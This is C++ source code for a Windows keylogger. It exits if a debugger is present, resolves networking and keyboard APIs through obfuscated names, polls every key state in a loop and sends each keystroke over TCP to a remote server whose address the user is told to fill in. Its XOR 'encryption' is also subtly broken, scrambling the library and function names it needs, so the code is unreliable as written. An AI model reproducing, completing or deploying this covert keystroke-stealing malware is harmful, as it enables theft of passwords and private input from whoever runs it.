#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <vector>
#include <ctime>

typedef int (WINAPI *pWSAStartup)(WORD, LPWSADATA);
typedef SOCKET (WINAPI *pSocket)(int, int, int);
typedef int (WINAPI *pConnect)(SOCKET, const struct sockaddr*, int);
typedef int (WINAPI *pSend)(SOCKET, const char*, int, int);
typedef int (WINAPI *pClosesocket)(SOCKET);
typedef int (WINAPI *pWSACleanup)(void);
typedef SHORT (WINAPI *pGetAsyncKeyState)(int);
typedef void (WINAPI *pSleep)(DWORD);

std::string encryptDecrypt(const std::string &input) {
    char key = rand() % 256;
    std::string output = input;
    for (int i = 0; i < input.size(); i++) {
        output[i] = input[i] ^ key;
    }
    return output;
}

bool isDebugged() {
    return IsDebuggerPresent();
}

void logKey(int key, SOCKET sock, pSend Send) {
    char buffer[2] = {(char)key, '\0'};
    Send(sock, buffer, 1, 0);
}

// Function to return server IP address
std::string getServerIp() {
    return "192.168.1.1";  // Replace with your actual server IP
}

// Function to return server port
int getServerPort() {
    return 12345;  // Replace with your actual server port
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (isDebugged()) return 1;

    srand(time(NULL)); // Seed random number generator
    std::string ws2_32 = encryptDecrypt("ws2_32.dll");
    std::string user32 = encryptDecrypt("user32.dll");
    std::string kernel32 = encryptDecrypt("kernel32.dll");

    HMODULE hWs2_32 = LoadLibrary(ws2_32.c_str());
    HMODULE hUser32 = LoadLibrary(user32.c_str());
    HMODULE hKernel32 = LoadLibrary(kernel32.c_str());

    if (!hWs2_32 || !hUser32 || !hKernel32) return 1;

    pWSAStartup WSAStartup = (pWSAStartup)GetProcAddress(hWs2_32, encryptDecrypt("WSAStartup").c_str());
    pSocket Socket = (pSocket)GetProcAddress(hWs2_32, encryptDecrypt("socket").c_str());
    pConnect Connect = (pConnect)GetProcAddress(hWs2_32, encryptDecrypt("connect").c_str());
    pSend Send = (pSend)GetProcAddress(hWs2_32, encryptDecrypt("send").c_str());
    pClosesocket Closesocket = (pClosesocket)GetProcAddress(hWs2_32, encryptDecrypt("closesocket").c_str());
    pWSACleanup WSACleanup = (pWSACleanup)GetProcAddress(hWs2_32, encryptDecrypt("WSACleanup").c_str());
    pGetAsyncKeyState GetAsyncKeyState = (pGetAsyncKeyState)GetProcAddress(hUser32, encryptDecrypt("GetAsyncKeyState").c_str());
    pSleep Sleep = (pSleep)GetProcAddress(hKernel32, encryptDecrypt("Sleep").c_str());

    if (!WSAStartup || !Socket || !Connect || !Send || !Closesocket || !WSACleanup || !GetAsyncKeyState || !Sleep) return 1;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;

    std::string serverIp = getServerIp();  // Get the server IP
    int serverPort = getServerPort();      // Get the server port

    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(serverIp.c_str());
    server.sin_port = htons(serverPort);

    SOCKET sock = Socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    if (Connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        Closesocket(sock);
        WSACleanup();
        return 1;
    }

    while (true) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                logKey(key, sock, Send);
            }
        }
        Sleep(10 + (rand() % 91));  // Sleep between 10 and 100 milliseconds
    }

    Closesocket(sock);
    WSACleanup();
    return 0;
}
